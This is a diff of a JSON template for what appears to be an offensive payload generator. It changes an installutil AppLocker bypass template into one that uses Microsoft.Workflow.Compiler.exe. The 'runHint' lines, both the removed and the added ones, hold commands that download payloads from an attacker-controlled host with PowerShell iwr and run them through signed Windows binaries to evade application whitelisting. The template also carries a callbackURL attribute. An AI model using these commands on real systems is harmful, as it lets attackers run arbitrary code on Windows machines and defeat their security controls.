@@ -1,10 +1,10 @@
 {
     "categories": [
-        "exe",
+        "cs",
         "applocker"
     ],
-    "description": "Downloads and runs an executable in memory for use with installutil applocker bypass.",
-    "contentFile": "exeapplockerexe.txt",
+    "description": "Outputs a .cs file for use with workflow compiler applocker bypass.",
+    "contentFile": "csapplockerworkflowcompiler.txt",
     "customAttributes": [
         {
             "name": "callbackURL",
@@ -27,23 +27,15 @@
         "hasShellCode": false
     },
     "compilation": {
-        "compilationType": "csharp",
-        "target": "exe",
-        "requiredAssemblies" : [
-            "System.Configuration.Install.dll"
-        ],
+        "__comment__" : "This isn't actually powershell but this will just print the .cs to a file uncompiled which is what we want.",
+        "compilationType": "powershell",
         "compilationAttributes": [
-            {
-                "name": "architecture",
-                "description": "The architecture, x64 or x86.",
-                "defaultValue": "x64"
-            },
             {
                 "name": "saveAs",
                 "description": "Name of file to be created, can be full path or just a name",
-                "defaultValue": "uninstallforexe.exe"
+                "defaultValue": "code.cs"
             }
         ]
     }, 
-    "runHint" : "powershell -c iwr http://[[[[ownIP]]]]/misc/uninstallforexe.exe -o uninstallforexe.exe\nC:\\Windows\\Microsoft.NET\\Framework64\\v4.0.30319\\installutil.exe /logfile= /LogToConsole=false /U C:\\users\\public\\uninstallforexe.exe"
+    "runHint" : "Run psapplockerworkflowcompiler ps script with the path on the target to code.cs somewhere and get the run.xml then.\npowershell -c iwr http://[[[[ownIP]]]]/misc/code.cs -o code.cs\npowershell -c iwr http://[[[[ownIP]]]]/misc/run.xml -o run.xml\nC:\\Windows\\Microsoft.Net\\Framework64\\v4.0.30319\\Microsoft.Workflow.Compiler.exe run.xml results.xml"
 }
